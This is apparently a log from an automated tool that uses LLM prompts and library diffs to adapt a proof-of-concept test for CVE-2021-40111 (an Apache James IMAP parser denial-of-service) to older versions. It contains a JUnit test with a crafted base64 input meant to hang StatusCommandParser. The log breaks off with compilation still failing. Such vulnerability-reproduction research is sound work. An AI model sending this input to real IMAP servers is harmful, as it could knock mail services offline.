Running main_process.py for CVE: CVE-2021-40111
Versions: 3.4.0

[1m[Main] === Starting adaptation process for CVE-2021-40111 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_apache_james_protocols_protocols-imap.txt[0m
[96m[Analyzer] org.apache.james.protocols:protocols-imap has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2021-40111[0m
[92m[Main] Total affected versions: 11[0m
[92m[Main] Already reproduced versions: 2[0m
[93m[Main] Versions pending adaptation: 9[0m
[96m[Main]     -> ['1.6.3', '3.0.0-beta5', '3.0.0-RC1', '3.0.0', '3.0.1', '3.1.0', '3.2.0', '3.3.0', '3.4.0'][0m
[96m[Main]     -> ['3.5.0', '3.6.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 3.4.0[0m
[96m[Selector] Closest reproduced version: 3.5.0 at index 9[0m
[96m[Adapter] Trying next closest version: 3.4.0[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2021-40111/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit[0m
[96m[Preparer] Updating dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 3.4.0 in /PoCAdaptation/exploit/pending/CVE-2021-40111/3.4.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 3.4.0...[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.5.0 to 3.4.0...[0m
[96m[Adapter] Start adapting exploit from 3.5.0 to 3.4.0"[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.api[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Tag[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2394 (prompt), 1 (completion), 2395 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
  symbol:   class Tag
  location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
  symbol:   class Tag
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 7 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.347 s
[INFO] Finished at: 2025-07-13T15:28:16Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,33] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: package org.apache.james.imap.api
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,61] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,102] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[30,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,59] cannot find symbol
[ERROR]   symbol:   class Tag
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[36,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 136 (prompt), 10 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class Tag, package org.apache.james.imap.api 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.api.Tag; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.api.Tag;Tag
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 33, 'message': 'cannot find symbol', 'symbol': 'class Tag', 'location': 'package org.apache.james.imap.api', 'code_line': 'import org.apache.james.imap.api.Tag;'} with cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[Adapter] Related diffs for error: [(4962, 8.0), (4990, 8.0), (4991, 8.0), (4997, 8.0), (4998, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Tag cause: ['org.apache.james.imap.api.Tag', 'Tag'][0m
[96m[RepairModule] Trying best diff #4962 with score 8.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(4990, 4998) with score 8.00[0m
[LLMClient] Tokens used: 1998 (prompt), 451 (completion), 2449 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Tag, location: package org.apache.james.imap.api

### Error Position:
import org.apache.james.imap.api.Tag;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/parser/AbstractMessageRangeCommandParser.java, Hunk: @@ -21,26 +21,28 @@

 import org.apache.james.imap.api.ImapCommand;
 import org.apache.james.imap.api.ImapMessage;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.message.IdRange;
-import org.apache.james.imap.api.message.response.StatusResponseFactory;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.message.request.AbstractMessageRangeRequest;
+import org.apache.james.protocols.imap.DecodingException;

 public abstract class AbstractMessageRangeCommandParser extends AbstractUidCommandParser {

+    public AbstractMessageRangeCommandParser(ImapCommand command) {
+        super(command);
-    public AbstractMessageRangeCommandParser(ImapCommand command, StatusResponseFactory statusResponseFactory) {
-        super(command, statusResponseFactory);
     }

     @Override
+    protected ImapMessage decode(ImapCommand command, ImapRequestLineReader request, String tag, boolean useUids, ImapSession session) throws DecodingException {
-    protected ImapMessage decode(ImapRequestLineReader request, Tag tag, boolean useUids, ImapSession session) throws DecodingException {
         IdRange[] idSet = request.parseIdRange(session);
         String mailboxName = request.mailbox();
         request.eol();
+        return createRequest(command, tag, useUids, idSet, mailboxName);
-        return createRequest(tag, useUids, idSet, mailboxName);
     }

+    protected abstract AbstractMessageRangeRequest createRequest(ImapCommand command, String tag, boolean useUids, IdRange[] idSet, String mailboxName);
-    protected abstract AbstractMessageRangeRequest createRequest(Tag tag, boolean useUids, IdRange[] idSet, String mailboxName);

 }
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/parser/AppendCommandParser.java, Hunk: @@ -18,68 +18,69 @@
  ****************************************************************/
 package org.apache.james.imap.decode.parser;

-import java.time.Clock;
-import java.time.LocalDateTime;
-import java.time.ZoneId;
 import java.util.Date;

 import javax.mail.Flags;

+import org.apache.james.imap.api.ImapCommand;
 import org.apache.james.imap.api.ImapConstants;
 import org.apache.james.imap.api.ImapMessage;
-import org.apache.james.imap.api.Tag;
-import org.apache.james.imap.api.message.response.StatusResponseFactory;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.decode.base.AbstractImapCommandParser;
 import org.apache.james.imap.message.request.AppendRequest;
+import org.apache.james.protocols.imap.DecodingException;
-
-import com.google.common.annotations.VisibleForTesting;

 /**
  * Parses APPEND command
  */
 public class AppendCommandParser extends AbstractImapCommandParser {
-    private final Clock clock;

+    public AppendCommandParser() {
+        super(ImapCommand.authenticatedStateCommand(ImapConstants.APPEND_COMMAND_NAME));
-    public AppendCommandParser(StatusResponseFactory statusResponseFactory, Clock clock) {
-        super(ImapConstants.APPEND_COMMAND, statusResponseFactory);
-            this.clock = clock;
     }

     /**
      * If the next character in the request is a '(', tries to read a
+     * "flag_list" argument from the request. If not, returns a MessageFlags
-     * "flag_list" argument from the request. If not, returns a Flags
      * with no flags set.
      */
+    public Flags optionalAppendFlags(ImapRequestLineReader request) throws DecodingException {
-    private Flags parseFlags(ImapRequestLineReader request) throws DecodingException {
         char next = request.nextWordChar();
         if (next == '(') {
             return request.flagList();
+        } else {
+            return null;
         }
-        return new Flags();
     }

     /**
      * If the next character in the request is a '"', tries to read a DateTime
+     * argument. If not, returns null.
-     * argument. If not, returns now.
      */
+    public Date optionalDateTime(ImapRequestLineReader request) throws DecodingException {
-    @VisibleForTesting
-    LocalDateTime parseDateTime(ImapRequestLineReader request) throws DecodingException {
         char next = request.nextWordChar();
         if (next == '"') {
             return request.dateTime();
+        } else {
+            return null;
         }
-        return LocalDateTime.now(clock);
     }

     @Override
+    protected ImapMessage decode(ImapCommand command, ImapRequestLineReader request, String tag, ImapSession session) throws DecodingException {
-    protected ImapMessage decode(ImapRequestLineReader request, Tag tag, ImapSession session) throws DecodingException {
         String mailboxName = request.mailbox();
+        Flags flags = optionalAppendFlags(request);
+        if (flags == null) {
+            flags = new Flags();
+        }
+        Date datetime = optionalDateTime(request);
+        if (datetime == null) {
+            datetime = new Date();
+        }
-        Flags flags = parseFlags(request);
-        LocalDateTime datetime = parseDateTime(request);
         request.nextWordChar();

+        return new AppendRequest(command, mailboxName, flags, datetime, request.consumeLiteral(true), tag);
-        return new AppendRequest(mailboxName, flags, Date.from(datetime.atZone(ZoneId.systemDefault()).toInstant()), request.consumeLiteral(true), tag);
     }
 }

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}


[LLMClient] Response: 
Here's the modified test file based on the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,105] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | class DecodingException', 'cannot find symbol | class Tag', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 39, Column: 14
  Message  : method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : super.decode(request, tag, session);
  Position : after the fixing line (9)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(4990, 4998) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
